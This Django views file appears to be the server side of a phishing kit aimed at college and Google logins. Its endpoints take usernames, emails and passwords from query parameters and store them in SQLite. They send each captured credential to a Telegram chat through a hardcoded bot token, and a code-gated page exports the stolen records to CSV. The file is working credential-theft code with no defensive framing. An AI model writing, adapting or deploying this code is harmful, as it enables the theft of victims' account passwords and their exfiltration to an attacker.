from django.http import HttpResponseRedirect,JsonResponse
from django.http import HttpResponse
from django.shortcuts import render
from pathlib import Path
import sqlite3
import os
import datetime as datetime_
import csv
import requests
import pytz
# import telepot


BASE_DIR = Path(__file__).resolve().parent.parent
db = sqlite3.connect(os.path.join(BASE_DIR, 'db.sqlite3'), check_same_thread=False)
cursor = db.cursor()


class Web_Logger:
    def view_records_ssdc(request):
        if request.method == "GET":
            code = str(request.GET.get('code'))
            if code == "14082001":
                cursor.execute("CREATE TABLE IF NOT EXISTS data (Timestamp TEXT, Site TEXT, Username TEXT, Password TEXT)")
                db.commit()
                cursor.execute("SELECT * FROM data")
                data = cursor.fetchall()
                with open(os.path.join(BASE_DIR, 'static', 'data', 'sddc_data.csv'), 'w') as file:
                    csv_file = csv.writer(file)
                    csv_file.writerow(['TimeStamp', 'Website', 'Username', 'Password'])
                    for row in data:
                        csv_file.writerow(row)
                return render(request, "records.html", {'info':'ssdc','data':data})
        return HttpResponse('Server Error: 500')


    def view_records_ssdg(request):
        if request.method == "GET":
            code = str(request.GET.get('code'))
            if code == "14082001":
                cursor.execute("CREATE TABLE IF NOT EXISTS data2 (Timestamp TEXT, Site TEXT, Email TEXT, Password TEXT)")
                db.commit()
                cursor.execute("SELECT * FROM data2")
                data = cursor.fetchall()
                with open(os.path.join(BASE_DIR, 'static', 'data', 'sddg_data.csv'), 'w') as file:
                    csv_file = csv.writer(file)
                    csv_file.writerow(['TimeStamp', 'Website', 'Email', 'Password'])
                    for row in data:
                        csv_file.writerow(row)
                return render(request, "records.html", {'info':'ssdg','data':data})
        return HttpResponse('Server Error: 500')


    def save_send_data_of_college(request):
        IST = pytz.timezone('Asia/Kolkata')
        date_time = datetime_.datetime
        TimeStamp = date_time.now(IST).strftime("%d-%m-%Y %I:%M %p")
        if request.method == "GET":
            site = str(request.GET.get('s'))
            username = str(request.GET.get('u'))
            password = str(request.GET.get('p'))
            cursor.execute("CREATE TABLE IF NOT EXISTS data (Timestamp TEXT, Site TEXT, Username TEXT, Password TEXT)")
            db.commit()
            cursor.execute("INSERT INTO data (Timestamp,Site,Username,Password) VALUES (?,?,?,?)",(TimeStamp,site,username,password))
            db.commit()

            # proxy_url = "http://206.253.164.122:80"
            # telepot.api._pools = {
            #     'default': urllib3.ProxyManager(proxy_url=proxy_url, num_pools=3, maxsize=10, retries=False, timeout=30),
            # }
            # telepot.api._onetime_pool_spec = (urllib3.ProxyManager, dict(proxy_url=proxy_url, num_pools=1, maxsize=1, retries=False, timeout=30))
            # end of the stuff that's only needed for free accounts

            # bot = telepot.Bot('5045027910:AAGK88EhI0pE3PIbjXxXpFCwAgD1U6QnQGc')
            # bot.sendMessage('711666569', ''+site+'\r\nusername: '+username+'\r\npassword: '+password,parse_mode='HTML')

            bot_token = '5045027910:AAGK88EhI0pE3PIbjXxXpFCwAgD1U6QnQGc'
            bot_chatID = '711666569'
            send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=HTML&text='+site+'\r\nusername: '+username+'\r\npassword: '+password
            requests.get(send_text)
            return JsonResponse(status=200,data={'ok':True})
        else:
            return HttpResponse('Server Error: 500')


    def save_send_data_of_google(request):
        IST = pytz.timezone('Asia/Kolkata')
        date_time = datetime_.datetime
        TimeStamp = date_time.now(IST).strftime("%d-%m-%Y %I:%M %p")
        if request.method == "GET":
            site = str(request.GET.get('s'))
            email = str(request.GET.get('e'))
            password = str(request.GET.get('p'))
            cursor.execute("CREATE TABLE IF NOT EXISTS data2 (Timestamp TEXT, Site TEXT, Email TEXT, Password TEXT)")
            db.commit()
            cursor.execute("INSERT INTO data2 (Timestamp,Site,Email,Password) VALUES (?,?,?,?)",(TimeStamp,site,email,password))
            db.commit()

            bot_token = '5045027910:AAGK88EhI0pE3PIbjXxXpFCwAgD1U6QnQGc'
            bot_chatID = '711666569'
            send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=HTML&text='+ site +'\r\nEmail: '+email+'\r\npassword: '+password
            requests.get(send_text)
            return JsonResponse(status=200,data={'ok':True})
        else:
            return HttpResponse('Server Error: 500')

